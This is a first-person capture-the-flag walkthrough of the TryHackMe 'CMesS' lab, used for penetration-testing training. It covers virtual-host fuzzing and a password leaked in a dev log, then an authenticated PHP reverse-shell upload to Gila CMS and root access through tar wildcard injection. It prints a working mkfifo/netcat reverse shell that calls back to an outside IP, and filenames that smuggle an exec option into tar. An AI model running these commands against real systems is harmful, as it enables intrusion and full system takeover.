TryHackMe — CMesS

Platform: TryHackMe
Difficulty: Medium
Category: Web, CMS Enumeration, Subdomain Enumeration, Initial Access, Privilege Escalation
Target: 10.49.141.126

1. Reconnaissance

I started with an Nmap scan to identify the services running on the target.
nmap -sV -sC -Pn -T4 10.49.141.126
The scan identified an Apache web server, so I focused the enumeration on the web application.

2. Web Enumeration

I used Gobuster to enumerate directories and files on the web server.
gobuster dir -u http://10.49.141.126 -w /usr/share/wordlists/dirb/common.txt
I then manually inspected the discovered web application using curl.
curl -s http://10.49.141.126
The page source revealed that the application was running Gila CMS:
<meta name="generator" content="Gila CMS">
The website also exposed several pages such as:
/about
/1/hello_world
/author/
I inspected the post page:
curl -s http://10.49.141.126/1/hello_world
The response revealed the intended hostname:
http://cmess.thm/gila/1/hello_world/
This indicated that cmess.thm was being used as the application's hostname.

3. Gila CMS Enumeration

I checked the login page:
curl -s http://10.49.141.126/login
The application provided an email and password login form.
I also checked the password reset functionality:
curl -s http://10.49.141.126/login/password_reset
The CMS version was not directly displayed on the main website, so I searched for known Gila CMS vulnerabilities using SearchSploit.
searchsploit "Gila CMS"
The search returned several results, including vulnerabilities affecting Gila CMS 1.10.9.
At this point, I continued with further enumeration instead of assuming the version.

4. Subdomain Enumeration with Wfuzz

Since the application was using cmess.thm, I checked for additional virtual hosts and subdomains.
I used Wfuzz to fuzz the Host header with a SecLists DNS wordlist:
wfuzz -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.cmess.thm" http://cmess.thm/
The important discovery was:
dev.cmess.thm
This suggested that a development virtual host was running on the same server.
I added the hostname to /etc/hosts:
10.49.141.126 dev.cmess.thm
I then verified that the hostname resolved correctly:
getent hosts dev.cmess.thm
Finally, I accessed the development site:
curl -i http://dev.cmess.thm/

5. Information Disclosure

The development website contained a development log with internal conversations between Andre and the support team.
The log revealed that Andre was unable to access the admin panel and had requested a password reset.
The support team later posted the reset password:
KPFTN_f2yxe%
The development page also exposed Andre's email address:
andre@cmess.thm
This provided valid credentials that could be used against the Gila CMS login.

6. Gila CMS Version Identification

Using the discovered credentials and further investigation of the application, I confirmed that the target was running:
Gila CMS 1.10.9
I verified the available exploits with:
searchsploit "Gila CMS 1.10.9"
The relevant result was:
Gila CMS 1.10.9 - Remote Code Execution (RCE) (Authenticated)
Since the credentials discovered through the development site provided authenticated access, this vulnerability became the path to initial access.

7. Initial Access

After logging into the Gila CMS administration interface, I used the available file management functionality to upload a PHP reverse shell.
The reverse shell was configured to connect back to my TryHackMe VPN IP:
192.168.129.177
and port:
4444
I started a Netcat listener on Kali:
nc -lvnp 4444
I then accessed the uploaded PHP reverse shell through the web application.
The target connected back to Kali and provided a shell on the target system.

8. Shell Stabilization

The initial reverse shell was not a fully interactive terminal, so I upgraded it using Python:
python3 -c 'import pty; pty.spawn("/bin/bash")'
I then backgrounded the connection with Ctrl+Z and configured the terminal:
stty raw -echo; fg
After returning to the target shell:
export TERM=xterm
This provided a more usable interactive shell.

9. Privilege Escalation

After obtaining access as Andre, I enumerated the filesystem and found a backup directory:
cd /home/andre/backup
The directory contained a file named:
note
The backup process was vulnerable to tar wildcard injection.
I created a script that would establish another reverse shell:
echo 'mkfifo /tmp/lhennp; nc 192.168.129.177 4444 0</tmp/lhennp | /bin/sh >/tmp/lhennp 2>&1; rm /tmp/lhennp' > exploit.sh
I then created the tar checkpoint files:
printf '\n' > './--checkpoint=1'
printf '\n' > './--checkpoint-action=exec=sh exploit.sh'
The directory now contained:
--checkpoint=1
--checkpoint-action=exec=sh exploit.sh
exploit.sh
note
When the scheduled backup process executed tar against the directory, these filenames were interpreted as tar options.
The checkpoint action caused exploit.sh to execute.
I started a Netcat listener on Kali:
nc -lvnp 4444
After the scheduled backup process executed, I received a reverse shell with elevated privileges.
I verified the privileges with:
whoami
The result was:
root
I also confirmed the user ID:
id
This confirmed successful privilege escalation to root.

10. Root Flag

With root access, I retrieved the root flag:
cat /root/root.txt
The root flag was successfully Obtained

New Commands and Their Uses

wfuzz: Used for web fuzzing. In this machine it was used to discover virtual hosts by fuzzing the Host header
wfuzz -c -w WORDLIST -H "Host: FUZZ.cmess.thm" http://cmess.thm/
curl : Used to make HTTP requests and inspect web application responses.
curl -i http://TARGET/
getent: Used to query the system's configured name-resolution services: getent hosts dev.cmess.thm
ss: Used to inspect listening network sockets and identify processes using ports.
ss -lntp
tcpdump: Used to capture and inspect network traffic. It can help troubleshoot reverse-shell connections.
tcpdump -ni tun0 'host TARGET_IP and tcp port 4444'

Lessons Learned

1. Web enumeration should go beyond directory discovery. Examining page source and HTTP responses can reveal technologies, hostnames and application details.
2. Virtual host enumeration is important. The main website did not expose the most useful information; the dev.cmess.thm virtual host contained the credentials needed for further access.
3. Development environments should be treated as potentially sensitive. The development log exposed internal conversations and a password.
4. Identifying the exact software version is important before selecting an exploit. SearchSploit helped correlate the Gila CMS version with known vulnerabilities.
5. Reverse shells depend on correct network configuration. When working with TryHackMe, the VPN interface address must be used for the callback.
6. A basic reverse shell is often inconvenient to work with. Python PTY spawning and terminal configuration can make it much more usable.
7. Scheduled jobs are important during Linux privilege-escalation enumeration. Backup processes should be examined for unsafe command usage.
8. Wildcards can become dangerous when their expanded filenames are interpreted as command-line options. The tar checkpoint technique demonstrated how an insecure backup process can lead to command execution.
9. Enumeration should be systematic. Each discovery led to the next stage:

Nmap → Gobuster → Gila CMS → Wfuzz → dev.cmess.thm → credential disclosure → Gila CMS 1.10.9 → initial access → reverse shell → tar wildcard privilege escalation → root.
Overall, CMesS was a useful exercise in combining web enumeration, virtual host discovery, information disclosure, CMS vulnerability research, reverse shells and Linux privilege escalation into one complete attack chain.
